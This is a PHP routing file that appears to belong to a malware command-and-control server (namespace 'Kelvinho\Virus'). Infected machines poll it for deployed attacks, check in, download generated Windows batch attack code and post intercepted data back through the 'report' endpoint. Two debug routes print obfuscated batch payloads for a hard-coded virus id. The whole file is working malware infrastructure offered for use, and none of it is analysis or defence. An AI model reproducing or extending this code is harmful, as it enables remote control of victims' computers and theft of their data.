<?php

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;
use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\Logs;

global $router, $requestData, $virusFactory, $attackFactory;

// routes for viruses
$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData, $virusFactory) {
    if (!$virusFactory->exists($virus_id = $requestData->getExplodedPath()[1])) Logs::strayVirus($virus_id);
    echo(join("\n", $virusFactory->get($virus_id)->getAttacks(AttackBase::STATUS_DEPLOYED)));
});
$router->getMulti(["vrs/*/ping", "viruses/*/ping"], fn() => $virusFactory->exists($virus_id = $requestData->getExplodedPath()[1]) ? $virusFactory->get($virus_id)->ping() : Logs::strayVirus($virus_id));
$router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () use ($requestData, $attackFactory) {
    if (!$attackFactory->exists($attack_id = $requestData->getExplodedPath()[3])) Logs::strayAttack($attack_id);
    ($attack = $attackFactory->get($attack_id))->getStatus() == AttackBase::STATUS_EXECUTED ? Header::notFound() : $attack->generateBatchCode();
});
$router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], fn() => $attackFactory->exists($attack_id = $requestData->getExplodedPath()[3]) ? $attackFactory->get($attack_id)->includeIntercept()->saveState() : Logs::strayAttack($attack_id));
$router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], function () use ($requestData, $attackFactory) {
    if (!$attackFactory->exists($attack_id = $requestData->getExplodedPath()[3])) Logs::strayAttack($attack_id);
    ($attack = $attackFactory->get($attack_id))->getStatus() !== AttackBase::STATUS_EXECUTED ? $attack->processExtras($requestData->getExplodedPath()[5]) : Header::notFound();
});

$router->get("obfuscate", fn() => print(Windows::obfuscate(Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3"))));
$router->get("complex", fn() => print(Windows::complexMain("209b093ec7c0610777b784fb29db4eb39b526a0a5c17c84040061a01ddb5b9e3")));
